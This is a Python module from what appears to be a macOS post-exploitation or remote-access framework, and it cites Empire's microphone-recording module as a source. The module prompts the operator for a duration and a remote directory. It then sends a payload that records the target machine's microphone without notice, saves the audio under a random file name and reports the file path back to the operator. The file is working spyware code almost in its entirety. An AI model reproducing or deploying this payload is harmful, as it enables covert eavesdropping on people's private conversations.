from modules.helpers import ModuleABC


class Module(ModuleABC):
    def __init__(self):
        self._record_time = None
        self._output_dir = None

    def get_info(self) -> dict:
        return {
            "Author": ["Marten4n6"],
            "Description": "Records the microphone.",
            "References": [
                "https://github.com/EmpireProject/Empire/blob/master/lib/modules/python/collection/osx/osx_mic_record.py",
                "https://developer.apple.com/documentation/avfoundation/avaudiorecorder"
            ],
            "Task": True
        }

    def setup(self, module_input, view, successful):
        self._record_time = module_input.prompt("Time in seconds to record [ENTER for 5]: ")
        self._output_dir = module_input.prompt("Remote output directory [ENTER for /tmp]: ")

        if not self._record_time:
            self._record_time = 5
        if not self._output_dir:
            self._output_dir = "/tmp"

        successful.put(True)

    def run(self) -> str:
        return """\
        import objc
        import objc._objc
        import time
        import sys
        import random
        import os

        from string import ascii_letters
        from Foundation import *
        from AVFoundation import *

        record_time = %s
        output_dir = "%s"
        
        pool = NSAutoreleasePool.alloc().init()

        # Construct audio URL
        output_file = ''.join(random.choice(ascii_letters) for _ in range(12))
        output_path = os.path.join(output_dir, output_file)
        audio_path_str = NSString.stringByExpandingTildeInPath(output_path)
        audio_url = NSURL.fileURLWithPath_(audio_path_str)

        # Fix metadata for AVAudioRecorder
        objc.registerMetaDataForSelector(
            b"AVAudioRecorder",
            b"initWithURL:settings:error:",
            dict(arguments={4: dict(type_modifier=objc._C_OUT)}),
        )
    
        # Initialize audio settings
        audio_settings = NSDictionary.dictionaryWithDictionary_({
            'AVEncoderAudioQualityKey' : 0,
            'AVEncoderBitRateKey' : 16,
            'AVSampleRateKey': 44100.0,
            'AVNumberOfChannelsKey': 2,
        })

        # Create the AVAudioRecorder
        (recorder, error) = AVAudioRecorder.alloc().initWithURL_settings_error_(
                                        audio_url,
                                        audio_settings,
                                        objc.nil,
        )

        # Bail if unable to create AVAudioRecorder
        if error is not None:
            send_response("Unexpected error: " + error)
            NSLog(error)
            sys.exit(1)

        # Record audio for x seconds
        recorder.record()
        
        for i in range(0, record_time):
            try:
                time.sleep(1)
            except SystemExit:
                # Kill task called.
                send_response("Recording cancelled, " + str(i) + " seconds were left.")
                break
        
        recorder.stop()
        
        del pool
        
        # Done.
        os.rename(output_path, output_path + ".mp3")
        send_response(MESSAGE_INFO + "Finished recording, audio saved to: " + output_path + ".mp3")
        """ % (self._record_time, self._output_dir)
